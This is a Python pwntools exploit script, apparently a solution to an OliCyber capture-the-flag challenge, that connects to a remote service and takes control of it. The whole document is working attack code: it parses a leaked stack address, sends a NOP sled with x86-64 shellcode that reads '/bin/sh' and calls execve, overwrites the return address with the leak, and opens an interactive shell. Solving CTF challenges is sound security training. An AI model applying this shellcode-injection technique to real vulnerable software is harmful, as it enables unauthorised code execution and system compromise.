#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template generatore_poco_casuale '--host=gpc.challs.olicyber.it' '--port=10104'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'generatore_poco_casuale')
context.terminal = ["alacritty", "-e", "zsh", "-c"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'gpc.challs.olicyber.it'
port = int(args.PORT or 10104)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        PIE enabled
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No

io = start()

io.recvlines(2)
leak = int(io.recvline().decode().split(":")[-1].strip())
log.info(f"stack leak: {hex(leak)}")

shellcode = f"""
    mov rax, 0x00 
    mov rdi, 0x00
    mov rsi, {leak}
    mov rdx, 0x08 
    syscall

    mov rax, 0x3b
    mov rdi, {leak}
    xor rsi, rsi 
    xor rdx, rdx
    syscall
"""

payload = asm("nop") * 8
payload += asm(shellcode)
payload += b'\x00' * (8 - (len(payload) % 8))
payload += p64(leak) * 100
io.sendline(payload)
io.recvlines(2)
io.sendline(b"s")
io.sendline(b"/bin/sh\x00")
io.interactive()

